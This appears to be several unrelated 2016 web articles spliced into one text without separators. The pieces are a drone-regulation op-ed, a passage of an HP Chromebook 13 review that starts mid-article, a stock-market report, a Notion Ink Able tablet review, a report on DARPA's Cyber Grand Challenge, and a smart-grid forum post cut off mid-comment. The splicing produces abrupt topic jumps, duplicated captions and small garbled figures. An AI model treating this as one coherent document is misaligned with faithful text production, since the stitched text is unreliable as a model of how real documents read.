Estimates of the drone market vary, but all agree that it’s exploding. At a White House workshop on drone policy Aug. 2, Intel Chief Executive Brian Krzanich, whose company produces control circuits for the units, projected that the consumer drone business will be worth $16 billion by 2020, and the commercial market another $4 billion. The Consumer Technology Assn. expects some 700,000 drones to be sold this year. Statistics from the Federal Aviation Administration attest to the growth trend: 520,000 of the devices have been registered with the FAA since it began requiring registration at the beginning of this year of any drones heavier than a half-pound. The number of manned aircraft registered with the FAA is only 320,000 — “and it took us 100 years to get there,” FAA Administrator Michael Huerta told the White House workshop. The popularity of drones poses challenges for policymakers and legislators, not unlike those posed by other new technologies with obvious benefits and possible dangers, such as self-driving cars: How can they minimize the drawbacks of the technology while it’s still under development, without stifling the innovation necessary to make the field grow? The FAA leaves most drone regulation to state and local authorities, though it does prohibit flying drones higher than 400 feet, within five miles of an airport or after dark, and requires that the devices remain within the line of sight of the users. But government officials have found it almost impossible to keep up with the mushrooming private drone fleet. Of 921 encounters between drones and manned aircraft reported to the FAA from mid-December 2013 to mid-September 2015, more than a third were “close encounters” carrying the possibility of a collision. According to an analysis by the Center for the Study of the Drone at Bard College, more than 90% occurred above 400 feet. Most also occurred within five miles of an airport.The stakes in these incidents are enormous. Any “collision between a drone and a manned aircraft could lead to a potentially catastrophic incident,” the analysis observed. Potentially hazardous encounters between drones and manned aircraft have soared over the last year, peaking in the summer months, according to FAA data. Bard College Potentially hazardous encounters between drones and manned aircraft have soared over the last year, peaking in the summer months, according to FAA data. Potentially hazardous encounters between drones and manned aircraft have soared over the last year, peaking in the summer months, according to FAA data. (Bard College) Some locations that are off-limits to manned aircraft have been bedeviled by drones. That includes the Golden Gate Bridge, which has become such a popular subject of high-flying remote videography — including by a drone that crashed onto the roadway in 2015 — that bridge officials had to post signs warning that drone flights are illegal over the bridge and nearby federal land.  More than a dozen bills to regulate drones are awaiting action in the state Legislature. Some resemble three bills that Gov. Jerry Brown vetoed last year that would have prohibited flying the devices over wildfires or other emergency scenes, K-12 schools and prisons or jails. Brown said he vetoed the measures because they criminalized conduct that was already illegal. But he did sign a measure aimed at paparazzi, prohibiting drone flights over private property to make a recording or snap a photo.  “The overarching themes of these bills,” says Steven D. Miller, an expert in the emerging field of drone law at the San Francisco law firm Hanson Bridgett, “are safety, security and privacy.” SNAP Video Government and industry leaders came together at the White House Aug. 2 for a workshop on federal drone policy. (Whitehouse.gov) Government and industry leaders came together at the White House Aug. 2 for a workshop on federal drone policy. (Whitehouse.gov) See more videos Some, including one measure Brown vetoed, aim to prohibit interference with firefighters or other first responders. They’re a reaction to numerous reports of drones getting in the way of firefighting aircraft; just last month a drone hobbyist was arrested for allegedly flying a drone over the Trailhead fire, which burned 5,600 acres in Placer and El Dorado counties. Other bills aim to grant government officials immunity for destroying or damaging drones that get in their way. Several aim to limit the ability of law enforcement officials to use drones to conduct surveillance. That addresses a key question not yet specifically considered by the courts, Miller observes: “Do police need a search warrant to fly a drone over your backyard?” Lobbying disclosures by drone makers and other companies only hint at the breadth of commercial interest in these devices. Both Amazon and Google have lobbyists watching the drone bills in Sacramento. Google has its eye on bills that would mandate insurance coverage on drones and GPS systems that would prevent drones from entering prohibited airspace. Google hasn’t taken a position on those measures yet, although DJI and GoPro, the camera maker whose devices are often attached to drones, oppose them.  California isn’t the first state to ponder drone regulations — 14 states have enacted rules governing some aspect of drone flights. But as a high-tech center, Miller says, “California may be more likely to come up with a creative approach that accommodates innovation.” So far, however, that prospect still lies on the horizon. As my colleague Jazmine Ulloa reported last month, industry is already flexing its muscles to block drone legislation in California, including a bill that would have placed limits on drone use by law enforcement and another that would have expanded no-fly zones around critical infrastructure, private property and parkland. State Sen. Hannah-Beth Jackson (D-Santa Barbara) who introduced the latter bill, complained that the technology industry hadn’t been willing to work with her to shape a compromise. The consequence of such blocking-and-tackling is exactly what the drone industry fears most — a patchwork of federal, state and local rules and ordinances to fill what Miller calls “a Wild West void.”  “Our interest is in reasonable outcomes and, most important, consistency,” says Brendan Schulman, vice president of policy and legal affairs for DJI. Generally, he says, DJI doesn’t object to measures that simply extend existing prohibitions to drones. The industry supports a proposed measure specifying that restraining orders protecting individuals from stalkers applies to drones flown within the prohibited space. “You shouldn’t be stalking somebody, including with a drone,” he says. But the industry objects to rules that single out drones, say, by requiring special permits for activities that would be otherwise legal.  After Brown issued his vetoes last year, the San Diego County community of Poway enacted its own ban on flying drones within the city during emergencies. “Poway has had a bull’s-eye on its back when it comes to wildfires,” Mayor Steve Vaus said then, targeting drone pilots “trying to get footage that they can monetize on YouTube … on the backs of our first responders.” The Los Angeles City Council last year passed an ordinance that resembles FAA rules by prohibiting flights higher than 500 feet, within five miles of an airport or 25 feet of a person, while imposing local punishments of up to $1,000 in fines and up to six months in jail.  Drones aren’t going away. That buzzing you hear is just the front edge of a tidal wave. Before it arrives, California legislators should have a single, consistent legal regime in place to protect the public from untrained and heedless remote pilots, and the drone industry should get behind reasonable rules. The first time an accident occurs that demonstrates how lax our oversight is of this emerging industry will be the last time it will have the credibility to sit at the table.  Keep up to date with Michael Hiltzik.

That's starting to change, however. Dell's Chromebook 13, which launched last fall, proved you could pack a sharp screen and keyboard into a device with strong performance and battery life. It was a bit pricier than the competition, but a little extra cash was well worth the upgrades. Now HP is taking the idea of a "premium" Chromebook to the next level with the new Chromebook 13. It starts at $499 and can be configured up to a whopping $1,029. That cash gets you a much thinner and lighter design than Dell's Chromebook, along with one of the best screens on the market. After spending some time with HP's latest Chromebook, there's no doubt it's an excellent machine. The question is whether it (or any Chromebook, for that matter) is worth HP's asking price.

Though HP’s latest is a joy to use, a less expensive Chromebook will suit most consumers just fine. Hardware There's no question in my mind that HP hit it out of the park with the Chromebook 13's design. It's the nicest Chromebook I've used outside the Pixel, which still costs significantly more than HP's offering. Visually, the Chromebook 13 sticks pretty close to the MacBook Air stylings that continue to dominate the industry. However, a few design notes, including its brushed-metal texture, black screen border and shiny chrome accents (including an overly large HP logo on the cover), lend it some unique visual flair. It's a nice-looking laptop, if a bit plain and derivative -- something that'll probably help it as a machine targeted at business customers. It's no Spectre 13.3, though. At 2.85 pounds and half an inch thick, it certainly has a lot in common with the many popular thin-and-light laptops available, and that's a place where it diverts from the similarly business-targeted Dell Chromebook 13. That computer is as solid as a rock, but it's a lot thicker and heavier than many other 13-inch laptops. The HP feels much more portable -- but it's not nearly as solid as the Dell. It's easy to flex the screen and chassis if you're so inclined. The screen flexing is particularly noticeable; my co-workers were pretty stunned at how easily I was able to bend the display. Obviously, this isn't normal behavior, but it does make me concerned about the laptop's long-term durability. Fortunately, the HP Chromebook 13 felt solid and comfortable in normal use. It's just not the tank that Dell's Chromebook is. Indeed, for real-world use, the HP feels great from the moment you open it up. You can easily lift the screen open with one hand; the body of the computer stays put and doesn't wobble on your lap or desk when you're adjusting the display. And what a display it is: The 13.3-inch screen has a best-in-class 3,200 x 1,800 resolution. (You can also save some cash by stepping down to a 1080p panel.) By default, it's scaled to an effective 1,600 x 900 resolution, but thanks to the pixel density, you get super crisp, readable text and wonderfully detailed images. And for me, 1,600 x 900 is a sweet spot in terms of having a large workspace and text that isn't too tiny. 1080p feels a bit small to me on a display like this, but if you want more space, there are plenty of scaling options in the Chromebook's display settings. I have a couple big complaints about the display, though. After using the Pixel, I've grown to love having more vertical real estate; HP's Chromebook 13 feels a little cramped in this regard. It doesn't help that the bezel at the bottom of the display is particularly thick: It feels like a 16:10 panel could have fit here without an issue. Of course, basically every computer out there has a 16:9 display aspect ratio, so this is hardly HP's fault. More damning is the lack of a touchscreen. With Android apps coming to Chromebooks soon, there's finally a good reason to have a touch panel, and it should be a default feature on an $819 computer. I could understand it being left off cheaper models in the lineup, but it should at least be offered as an optional upgrade. And while the viewing angles on this screen aren't bad, it's not an IPS display, so you won't get the wide field of view that some other notebooks offer. Despite these few complaints, the screen is a high point. It's about the best I've seen on a Chromebook. That should be the case for an $820 machine, but the fact that you can get the same display on a $500 version of this laptop is a big win. Beyond the screen, the keyboard and trackpad are of utmost importance, and fortunately HP got both of these things right. I've been happily typing away on this computer for over a week, and it feels nearly as good as the Chromebook Pixel and equally as comfortable as the Dell Chromebook 13. There's an adjustable backlight here, which feels appropriate for a computer in this price range, and the keycaps offer decent travel for a computer this thin. As for the trackpad, the only complaint I have is that, similar to the screen, I wish it were a bit taller. Other than that, it works fine. I'm glad to see laptop manufacturers starting to get touchpads consistently right. HP touts stereo speakers from Bang & Olufsen, and while there's only so much you can do with speakers in a smallish laptop, these sound pretty good to me. They're not any louder than your average notebook audio setup, but they're definitely crisper and less muddy than on most other computers. You're still probably better off listening with headphones, but in a pinch these will do -- just don't expect any physics-defying sound here. As for ports, the HP Chromebook 13 keeps things pretty minimal: There's one USB 3.0 connection, a headphone jack, two USB Type-C sockets (either of which can be used for charging) and a microSD slot. I'm confounded by laptop makers that insist on microSD; a full-sized SD reader would be far more useful for most people. Having two USB Type-C ports is smart, though: You can dedicate one to power if need be and still have options for plugging in more devices, including the HP docking station designed specifically for this laptop. Performance and battery life HP's Chromebook 13 is the first Chromebook I've tried that uses Intel's newest generation of Core M processors. The $819 model I tested has a 1.1GHz Core m5 processor paired with 8GB of RAM and 32GB of storage space. We'll talk more about whether this computer is worth that kind of cash, but for now, the most important thing to know is that HP is offering this computer in a variety of configurations. The base $499 model pairs a Pentium 4405Y processor with 4GB of RAM; $599 steps that up to the Core m3-6Y30 processor with the same RAM allotment. If you're feeling particularly crazy, you can upgrade to a Core m7-6Y75 processor with either 8GB or 16GB of RAM. HP says you can get that top-of-the-line model from "select retailers" for $1,029. However, I only had the $819 model to test. At that price (more than nearly any other Chromebook on the market), I was expecting a great experience, and fortunately I was not disappointed. Anecdotally, I was able to run all of my usual apps (Inbox, Chrome, Google Play Music, TweetDeck, Slack, Keep, Docs, Wunderlist, Hangouts) plus more than a dozen tabs with few hiccups. Music would occasionally cut out slightly, and typing text in Keep felt a bit laggy while I was simultaneously doing a video call, but by and large I have no complaints about the performance. And from a benchmark perspective, the Chromebook 13 kept pace with the best you can get when running Chrome OS, including the Pixel.

I will say that I've had one big issue that I can't overlook, and that's the battery life. HP claims that the Chromebook 13 gets 11.5 hours of runtime, with a big caveat: You need the model with the 1080p screen to achieve that result. HP doesn't offer any estimates for the 3,200 x 1,800 screen I've been using, but I only got about 6 hours of battery life doing my normal work routine. This is a major disappointment, especially after enjoying incredibly long battery life on Dell's Chromebook 13. HP's machine is smaller and has a sharper, more power-hungry screen -- but getting significantly less than eight hours of battery life is a serious bummer. Our battery test (which involves looping an HD video with screen brightness fixed at 65 percent) bore similar results: The HP Chromebook 13 lasted for 6 hours and 33 minutes. And unfortunately, the computer didn't charge as quickly as I'd hoped, despite HP touting USB Type-C's quick-charging features. It took about two and a half hours while in use to go from nearly dead to 100 percent and a good 90 minutes to get to 50 percent. Battery life HP Chromebook 13 6:33 Surface Book (Core i5, integrated graphics) 13:54 (3:20 tablet only) MacBook Air (13-inch, 2013) 12:51 HP Spectre x360 11:34 Apple MacBook Pro with Retina display (13-inch, 2015) 11:23 ASUS C200 Chromebook 11:19 ASUS Chromebook Flip 10:49 Dell Chromebook 13 10:25 Acer Chromebook 13 10:07 Chromebook Pixel (2015) 10:01 Microsoft Surface 3 9:11 Apple MacBook (2016) 8:45 Samsung Chromebook 2 (13-inch) 8:22 HP Stream 11 8:17 Dell XPS 13 (2015) 7:36 Lenovo Yoga 3 Pro 7:36 Lenovo LaVie Z 7:32 Microsoft Surface Pro 4 7:15 HP Spectre 13 7:07 Lenovo LaVie Z 360 6:54 Toshiba Chromebook 2 6:34 Acer C720 Chromebook 6:27 (Core i3) / 5:57 (Celeron) None of this matters if Chrome OS doesn't have the apps and services you need to get things done. Fortunately, as I wrote last fall, Chrome OS is pretty capable right now. There are tasks like photo and video editing that the platform is still not suited for, but for the majority of consumers, using a Chromebook might increasingly make sense. I rarely felt like I was hamstrung when using HP's Chromebook 13, and the Android apps coming this fall will make the platform even more capable. It's still worth making sure what you typically do on a laptop is feasible with a Chromebook, but Google has closed the feature gap in the past few years. The competition As I've mentioned multiple times by now, Dell's Chromebook 13 is the computer most worth comparing to the HP Chromebook 13. HP's model is the clear winner in terms of design and display, but the Dell counters with a much lower price and far better battery life. Dell also has a variety of configurations: You can step up to a full Core i3 processor, increase the RAM to 8GB and add a touchscreen. If you're interested in HP's Chromebook 13, I'd encourage you to also check out the Dell before making a final decision. Unless you really love the HP's more compact design or its super sharp screen, the Dell wins on bang for your buck. There aren't a lot of other Chromebooks that have excellent screens, keyboards, performance and design. The Chromebook Pixel is one, of course -- but at $1,299, there's no way we can recommend that computer to most normal humans. Toshiba's 13-inch Chromebook 2, released in 2015, is still a strong choice. About $340 gets you a 1080p display, decent construction and an Intel Core i3 processor. The battery life on that laptop isn't outstanding, but performance will not be a problem. Most other Chromebooks beyond these are compromised in one way or another: cheap construction, small or low-resolution screens, or -- worst of all -- bad processors leading to poor performance. Wrap-up Similar to the Chromebook Pixel that appears to have inspired it, HP's Chromebook 13 occupies an odd spot in the market. As tested, it's hard to recommend anyone spend $819 on this laptop. It packs a wonderful screen and keyboard into a thin and light package, and it combines that with solid performance. But the battery life isn't great, and $819 is still too much to spend on a Chromebook. Yes, they're better than they ever have been, and they're going to get a lot more useful this fall when they start supporting Android apps. But even as someone who has wanted a "premium" Chromebook option beyond the Pixel for a long time, I can't justify the cost of this computer. Fortunately, HP is making two models that are cheaper than this one. You can still get the same great package, just with less RAM and a slower processor, for the much more reasonable price of $499. I haven't tested that machine yet, so I can't give it a full-throated recommendation yet. But if you've been searching for a Chromebook with premium build quality like I have, it might be worth seeing if the cheaper versions of HP's Chromebook 13 can meet your needs.

The report showed strong gains for July, underlining the strength of the job markets. Commodities are lower and the dollar is mostly higher. The data that has come at a time when the prospects for the global economy looks bleak and therefore could provide a big thrust, resulting in a shift in gear from the recent lackluster phase.   Despite the Bank of England's stimulus announcement, U.S. stocks went about in a listless manner on Thursday before ending narrowly mixed. The major averages opened mixed but fell uniformly lower in late morning trading. After recouping its losses by early afternoon trading, the Dow Industrials moved back and forth across the changed before slipping yet again in late afternoon trading. Thereafter, the index languished mostly in the red before ending down 2.95 points or 0.02 percent at 18,352.    The S&P 500 Index also saw volatility throughout the rest of the session yet ended up 0.46 points or 0.02 percent at 2,164. Meanwhile, the Nasdaq Composite held mostly above the unchanged line before ending 6.51 points or 0.13 percent higher at 5166.    Fifteen of the thirty Dow components closed lower, while the remaining 15 stocks advanced. Disney (DIS) fell steeply, but Visa (V) and Intel (INTC) moved notably to the upside.    Among the sectors, airline and gold stocks saw significant strength on the day, while considerable weakness was visible among biotechnology stocks.    On the economic front, the Labor Department reported that jobless claims rose to 269,000 in the week ended July 30th from 266,000 in the previous week. Economists expected claims to have edged down to 265,000.     The four-week average rose to 260,250 from 256,500. Continuing claims calculated with a week's lag fell by 6,000 to 2.138 million in the July 23rd.     The Commerce Department reported a 1.5 percent month-over-month drop in factory orders for June, a smaller drop than the 1.8 percent decline expected by economists.    Currency, Commodity Markets Crude oil futures for September delivery are slipping $0.17 to $41.76 a barrel after jumping $1.10 to $41.93 a barrel on Thursday. Gold futures are currently trading at $1,353.30 an ounce, down $14.10 from the previous session's close of $1,367.40 an ounce. On Thursday, gold climbed $2.70.     On the currency front, the U.S. dollar is trading at 101.26 yen compared to the 101.22 yen it fetched at the close of New York trading on Thursday. Against the euro, the dollar is valued at $1.1101 compared to yesterday's $1.11.30.  Asia   Most Asian markets ended higher, as the BoE stimulus announcement stimulated buying, although the Japanese market ended nearly flat and the Chinese market closed modestly lower. The mood was cautious as traders awaited the U.S. jobs report.    The Japanese market was dragged lower, as a firmer yen offset the broader positive sentiment. The Nikkei 225 Index opened higher and held mostly above the unchanged line for much of the session. However, the index finished the day roughly flat, edging down 0.44 points to 16,255.    Food, construction, chemical, finance and retail stocks saw weakness, while export, resource and utility stocks ended mixed.    Meanwhile, Australia's All Ordinaries Index hovered in positive territory throughout the session, ending up 22.20 points or 0.40 percent at 5,586. Material and energy stocks led the day's advances, while defensive stocks moved to the downside.    Hong Kong's Hang Seng Index closed at 22,146, up 313.86 points or 1.44 percent, while China's Shanghai Composite Index closed 5.73 points or 0.19 percent lower at 2,977.    On the economic front, the latest survey from the Australian Industry Group revealed that growth in the construction of new housing slowed in July after reaching a 10-month high in the previous month.     Separately, the Reserve Bank of Australia left its growth and inflation forecasts unchanged in its quarterly statement on monetary policy, although it said a rate cut will create room for even stronger growth.    Preliminary data released by Japan's Cabinet Office showed that its leading indicator for Japan held steady at 98.4 in June, while economists expected an increase. The current and the lagging indexes rose.    Total labor cash earnings in Japan increased in June after falling in the previous month, a preliminary report from the Ministry of Health, Labor and Welfare showed. Gross earnings climbed 1.3 percent year-over-year in June, reversing a 0.1 percent drop in May, which was the first decline in eleven months. Economists had expected a 0.3 percent increase for June.     Europe   European stocks opened higher and rose sharply in early trading. After giving up some of the gains, with Germany's DAX even slipping below the unchanged line, the indexes moved back to the upside. The averages are currently higher, seeing a sharp spike in the aftermath of the jobs report, adding onto the BoE-induced gains on Thursday.    In major corporate news, cement conglomerate LafargeHolcim grew its quarterly profit even as sales declined, helped by cost cutting and asset sales. Allianz reported disappointing quarterly profits.    On the economic front, data released by Germany's Federal Statistical Office showed that factory orders in Germany fell 0.4 percent month-over-month in June, in contrast to a revised 0.1 percent increase a month ago. Economists had expected orders to rise by 0.5 percent.    U.K. house price inflation remained unchanged at a 12-month low in the three months to July, the results of a survey by the Lloyds Banking Group subsidiary Halifax showed. The Halifax house price index rose 8.4 percent year-over-year in the three months to July, the same rate as in the June quarter and the lowest since July 2015. Economists had expected an acceleration to 8.8 percent.    U.S. Economic Reports   For the second consecutive month, the Labor Department released a report showing much stronger than expected U.S. monthly job growth. The report released by the Labor Department showing that non-farm payroll employment surged up by 255,000 jobs in July after jumping by an upwardly revised 292,000 jobs in June.   Employment had been expected to increase by about 185,000 jobs compared to the addition of 287,000 jobs originally reported for the previous month. Even with the stronger than expected job growth, the unemployment rate held at 4.9 percent in July. The unemployment rate had been expected to edge down to 4.8 percent. With the value of imports increasing by much more than the value of exports, the Commerce Department released a report showing that the U.S. trade deficit widened by more than anticipated in the month of June. The report said the trade deficit widened to $44.5 billion in June from a revised $41.0 billion in May. The deficit had been expected to widen to $43.0 billion from the $41.1 billion originally reported for the previous month. At 3 pm ET, the Federal Reserve is set to release its outstanding consumer credit report for June. Economists expect a $15.5 billion increase in outstanding consumer credit for the month.   Outstanding consumer credit increased by $18.6 billion in May compared to the consensus estimate for a $16 billion increase and the $13.4 billion increase in April. Revolving credit rose by $2.4 billion and non-revolving credit tied to auto and student loans increased by $16.2 billion.  Stocks in Focus   Activision Blizzard (ATVI) reported better than expected second quarter results and raised its guidance for the full year. Take-Two (TTWO) also reported above-consensus results for its first quarter and issued positive guidance for the second quarter and the full year.    Allscripts Healthcare (MDRX) reported in line second quarter adjusted earnings and better than expected revenues. The company's full year guidance was in line.    Fluor's (FLR) second quarter bottom line results trailed estimates but its revenues exceeded expectations. The company's full year guidance was in line.    Kraft Heinz (KHC) reported above-consensus second quarter adjusted earnings per share and in line revenues.    LinkedIn (LNKD), which has agreed to be acquired by Microsoft (MSFT), reported solid second quarter results.    Priceline Group (PCLN) reported second quarter adjusted earnings per share that beat estimates but its revenues were below estimates. The company's full year guidance was in line.    Symantec's (SYMC) first quarter results topped estimates and its second quarter revenue guidance was upbeat.    Weight Watchers (WTW) reported in line second quarter earnings per share, although its revenues trailed expectations. by RTT Staff Writer For comments and feedback: editorial@rttnews.com The Worst IPO flops of 2016 Preview: Thanksgiving Week Economic Data Top Ten Corporate Comeback Stories Please enable JavaScript to view the comments powered by Disqus. comments powered by Disqus Follow RTT Editor's Pick Most Read Most Emailed Offices Of Samsung, Pension Fund Raided Over Scandal Involving President Infineon Sees Higher FY17 Revenues, Raises Margin View, Despite Weak Q4 Profit Volkswagen Brand Focuses On Electric Cars, US In Transformation Plan Twitter Suspends CEO Jack Dorsey's Account Briefly HP Q4 Profit Meets View - Update What's In The Offing For These Biotech Stocks?

Powered by a quad-core Intel Cherry Trail processor paired with 4GB of RAM, the Able has 64GB of on-board storage and supports microSD cards of up to 128GB in size. While the regular version of the 2-in-1 (running Windows 10 Home) is priced at Rs 24,990, the enterprise variant (having Windows 10 Pro) bears a price tag of Rs 29,990. Notion Ink Able is available exclusively (for now) on Snapdeal. Here's our in-depth review of the Notion Ink Able. | TOI Tech | Updated: Aug 5, 2016, 04.13 PM IST Critic Rating3.5/5 User Rating3.1/5 Top Features* Robust build * Decent battery life * Capable hardware While they are still not as widely used as traditional laptops or PCs, hybrid computers have been steadily gaining popularity. Also known as convertibles or 2-in-1s, these devices offer the convenience of a tablet and (some) performance of a laptop in a compact form factor. Indian OEM Notion Ink recently launched its Able 2-in-1machine in the Indian market. Available exclusively (for now) on Snapdeal, the Able is the successor, or more of a Biblical brother (although with a differently spelled name), to the Bengaluru-based company's previous Windows-powered tablet - Cain. Glancing at the raw specifications, Notion Ink's newest convertible seems like a really promising device. But how well do those specs translate into real-world performance, that too at an asking price of Rs 24,990? Let's find out, in our full review of the Notion Ink Able. ​ ​ Design and build quality Being a hybrid, Notion Ink Able is essentially a two-part construction - a tablet and a detachable keyboard. All of the buttons and ports are on the tablet itself. Assuming it's held in landscape orientation, the top left side of the tablet houses the power/sleep button and the volume rocker. On the left, you'll find a 3.5mm audio jack (with mic input), a Micro HDMI slot, a USB 2.0 port, a microUSB 2.0 port, a USB 3.0 port, a sim card slot (for 3G data connectivity) and a microSD card slot (for memory expansion up to 128GB), in that order. Coming to the right, this is where the two speakers are located. As for the bottom, it has the pogo pins and two magnetic inserts for connecting the tablet with the keyboard. The front is all about the 10.1-inch display with 10-point multi-touch support. Above the top edge of the screen lie an LED indicator and a 2MP OmniVision camera for video-calling and the occasional selfie. A Windows logo adorns the center of the bottom edge of the display. Flip it and the tablet reveals another 2MP OmniVision camera as well as the Notion Ink branding. Coming to the Able's detachable keyboard, it's made of aluminium. Other than the chiclet keys, the black colour unit is comprised of a multi-touch enabled trackpad (with gesture support), two small indicator lights and an adjustable hinge for latching the tablet to the keyboard. All said, we found the overall design and build quality of the Notion Ink Able to be pretty solid. The tablet part is quite sturdy and doesn't creak much when subjected to (a little) pressure. The keyboard module is good as well, with keys having decent travel distance and feedback. They are a little cramped, but that can be excused, given the size of the keyboard. However, the matte-finished underside of the keyboard is a huge fingerprint and smudge magnet, as opposed to the hard-plastic rear of the tablet module. Display Notion Ink Able comes with a 10.1-inch IPS LCD display supporting 1,280x800 pixel resolution. The display is multi-touch supported up to 10 points. Despite the low-resolution, the display still renders everything from websites to videos to graphics with fairly crisp details. Colour reproduction is fairly accurate, and so are the viewing angles. Sunlight legibility shouldn't be an issue either, but you'll need to turn up the brightness quite high for things to be visible. But all's not good. During our testing, we found the touch-response of the screen to be a bit erratic. The display took more than a few taps to register touches on more than one occasion. We really hope this is something that can be fixed by a driver update or something like that. Performance The Notion Ink Able is powered by a quad-core Intel Cherry Trail CPU, clocked at 1.84GHz (burst). Having 4GB of DDR3 RAM and 64GB of on-board storage, it runs Windows 10 Home (Pro on the enterprise variant). During our time with the convertible, we found the Able to be great for (light) daily computing tasks. All of the Windows 10 universal apps worked well, too. But, that doesn't mean everything was hunky dory. READ ALSO: READ ALSO: Notion Ink launches 2-in-1 tablet Able 10 in India Even though web browsing was fine through Microsoft Edge, using Google Chrome with a few open tabs taxed the device more than we thought it would. Switching tabs even after a few seconds caused the open web pages to reload constantly. Creating and editing documents (through the pre-installed mobile version of Microsoft Office) wasn't a really perfect experience either, with the application(s) crashing every now and then. Talking about video playback, Notion Ink Able was able to play Full HD videos (both local and streaming) without a hitch. As far as games are concerned, Notion Ink Able, with on-board Intel HD Graphics, was able to run Microsoft Store titles like Asphalt 8: Airborne and Sniper Fury sans any problems. That said, don't expect it to run GTA V. Notion Ink Able includes almost all connectivity options that you can think of, including Wi-Fi 802.11 b/g/n, Bluetooth 4.0 and 3G cellular data. During our testing, all of these worked as they should have. No complaints here. Moving to the battery life, the Able's 8,100mAh cell lasted around 6 hours on a single charge. The usage involved a mix of web browsing, multimedia playback and light gaming. While not the greatest battery life, it's decent enough. READ ALSO: READ ALSO: Notion Ink Able 10 tablet price and specifications revealed ahead of launch In summation, if your computing needs are basic and only involve stuff like creating/editing documents, web browsing and playing a light game every now and then, the Notion Ink Able is going to serve you just fine. Verdict The Able boasts a durable build paired with capable innards, making for a nice everyday computing experience. But, it does come with its set of flaws. Random application crashes and a less-than-perfect touch display prevent it from being an overall package. And even though the hardware is reasonably compelling, the asking price of Rs 24,990 (that too, for the non-enterprise variant) is a tad steep. For that price, you can easily get regular-sized laptops powered by more powerful Core i3 processors. They may not be portable (and are certainly not convertible), but they can handle everyday computing tasks much better.

Intel flogs security software biz, pockets $3.1bn DEF CON A quest to build a smart computer system that finds and patches bugs faster and more efficiently than humans is off to a good start with all the teams in DARPA’s Cyber Grand Challenge performing very well indeed. The contest, held at the DEF CON hacking conference in Las Vegas, was organised by the research arm of the US military and saw seven teams test out their automated seek-and-patch-ware in a simulated operating system. The eight-hour contest saw the teams find and patch 420 flaws and create 650 proofs of concepts. “Our mission is to change what’s possible so we can take huge strides forward in our national security capabilities,” said Arati Prabhakar at the post-contest press conference. “We did it today and it was a very satisfying experience.” Each team was equipped with a server containing 128 Intel Xeon processors running at 2.5 GhZ and boasting over a thousand processing cores, 16TB of RAM and a liquid cooling system that required 250 gallons of water per minute to cool the big iron. They were let loose on a custom-designed operating system and instructed to find flaws, patch them automatically, and provide proof of concepts for flaws in each other's systems. At the same time seven other similar system were used by the judges to monitor the progress of the event as the systems ran 96 rounds lasting 270 seconds, with 30 second breaks in between rounds. At stake was US$3.75m in government greenbacks. The competition, which has taken three years and $55m to set up, is designed to automate the whole process of bug hunting. Mike Walker, the DARPA program manager overseeing the Cyber Grand Challenge, said that this was the first stage in a possibly decade-long process to automate security monitoring and make networks more resilient. “We have redefined what is possible and we did it in the course of hours with autonomous systems that we challenged the world to build,” he said. “I want people to understand how difficult it is to build prototype revolutionary technology and field it in front of the eyes of the world. I have enormous respect for those folks.” A DARPA representative told The Reg that at this stage the winning team, with 270,042 points, was the ForAllSecure team, founded by the Carnegie Mellon University professor of electrical and computer engineering David Brumley. Results aren't final, but if confirmed his team will scoop the $2m top prize. The ForAllSecure team’s success was all the more surprising because a key bug finding system in the computer’s programming crashed around half way through the competition. It repaired itself and got back up and running before the competition ended but maintained a narrow lead until the end of the contest. In second place, with 262,036 points, was the TechX team from GrammaTech and the University of Virginia, setting them up for a $1m payday. In third place was the Shellphish team, led by Professor Giovanni Vigna, director of the Centre for CyberSecurity at the University of California, Santa Barbara, who are in line for $750,000. Once the results have been confirmed the winning system will be pitted against human foes in a capture the flag competition. Walker said that he didn’t expect the automated system to come close to matching fleshy competitors in the contest, but the first five minutes of the competition would give a good example of how computers could leverage their faster processing speed against human inventiveness. This is a long road we are going to travel, Walker stressed. The first United States Computer Chess Championship took place in 1970 and it wasn’t until 1996 that IBM’s Deep Blue system finally beat a human grandmaster at the game - and then only at speed chess. But the fuse has been lit he said, and the clock is now ticking for professional bug hunters ... and perhaps the automated systems that could one day put them out to grass. ® Sponsored: Magic quadrant for enterprise mobility management suites Tips and corrections 8 Comments More from The Register DARPA does a podcast 2006 called, it wants its technology back 6 Comments Hypersonic cruise missile scores US$175m DARPA cash Raytheon gets the job of delivering death from above at Mach 5 28 Comments DARPA hands space junk spotting scope to US Air Force Space Surveillance Telescope can spot specks of shiny 36,000km away 15 Comments DARPA unveils robot co-pilot Your inflatable buddy in the cockpit 10 Comments DARPA demands brand-new command … IN SPAAACE!

In the strategic marketing world, we often talk about motivating innovators and early adopters sufficiently to catalyze a “crossing of the chasm.” The concept can be viewed in terms of a product adoption model that breaks up markets into customer segments, as shown below: It is often assumed that this model, promoted by Geoffrey Moore in Crossing the Chasm, fits our industry’s smart grid and grid-edge efforts. But does it? Has your transformer’s or circuit breaker’s cost been cut in half while doubling its electric capacity every 18 months? No.  Why do I refer to 18 months? Because the chasm-crossing model is driven not by our industry but by the more rapid pace of change in the IT and semiconductor industries, due to the 18-month “rule” in Moore’s Law. (Moore’s Law — from Intel’s Gordon Moore, not “Crossing the Chasm’s” Geoffrey Moore — says that the number of transistors in a dense integrated circuit doubles approximately every 18 months, and has been born out since the invention of the transistor in the 1950s, with ongoing reductions in associated costs and increases in associated computing power.) Here are two examples of smart grid "forced fits": 1. We have numerous smart grid programs that take a "focus group” marketing approach, designing different messages to keep each segment “happy,” including a lot of segments that overlap with Geoffrey Moore’s chasm-crossing segments. Is this a forced fit? 2. We have numerous attempts to apply this chasm-crossing model to grid-edge technology uptake as well. The Networked EV: Smart Grids and Electric Vehicles; First Stop, California by Greentech Media (Feb. 2010) is a classic example. The article states that the “chasm” had not yet even been approached for EVs and talks about needs for a greater smart grid infrastructure to support EVs as “a future ‘killer app’ of the smart grid.” The fundamental assumption of these two examples is that the chasm-crossing model fits — somehow. Isn’t it naïve to think everyone to the right of the chasm — the pragmatists, conservatives, skeptics and laggards — will simply start buying EVs or Nest thermostats like hotcakes once the needs of innovators and early adopters are met? My question for our IdeaXchange Xperts is this: How well do you think “chasm-crossing” theory fits our industry, and what are the bad consequences of “force-fitting it” where it does not belong? Don McDonnell » 1 2 3 4 5 6 Next Print reprints Favorite EMAIL Tweet Discuss this Article 1 Ike Kiefer on Aug 10, 2016 Excellent topic. I appreciate the evenhanded setup to the question. Also some very insightful comments made by others already on this thread. Working 25 years in the military, I have been on the receiving end of many top-down, force-fed early adoptions. Most were flops. The ones that stuck were still painful lessons in the costs of a naive approach to premature change. Some failed because they were nothing more than bumper sticker slogans lean on real original content. Others failed because they were ephemeral fads cooked up by ivory tower intellectuals uninformed by practical life experience. The 